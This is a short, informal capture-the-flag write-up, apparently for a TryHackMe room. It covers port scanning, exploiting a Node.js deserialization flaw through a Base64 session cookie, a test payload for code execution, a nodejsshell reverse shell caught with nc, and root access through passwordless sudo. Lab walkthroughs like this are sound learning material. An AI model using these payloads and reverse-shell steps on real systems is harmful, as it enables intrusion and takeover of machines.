basic scan:
 sudo nmap -sV -sC -O -p- -n -Pn 10.113.169.252
after the scan i didnt find alot of things but ssh and http
i open the web page, i saw that there is a POST method based to the backend
checked on the session, it was encoded in Base64 passing an object with contain the word that i entered 
i checked on object parsing vulnerability and found "seriablization vulnerability"

i passed this:
_$$ND_FUNC$$_function (){ return 'hi'; }()

and it returns hi so there is a code execution using IIFE which runs the function when adding () after completing the function
so i used nodejsshell to create a reverse shell

using VPN IP
nodejsshell 192.168.146.215 4444
then used output the create the final cake:

and before passing the vulnerable code in the input i listened on port 4444 using nc
nc -lvnp 4444

after connecting to the server, i passed this command to find the user.txt file
find / -name user.txt -type f 2> /dev/null
and found it in /home/dylan/user.txt
then i entered the flag in tryhackme
next i checked on sudo -l and i found that i can use sudo without password required
i passed sudo su the be root
next i passed 
find / -name root.txt -type f 2> /dev/null
and found it in /root/root.txt
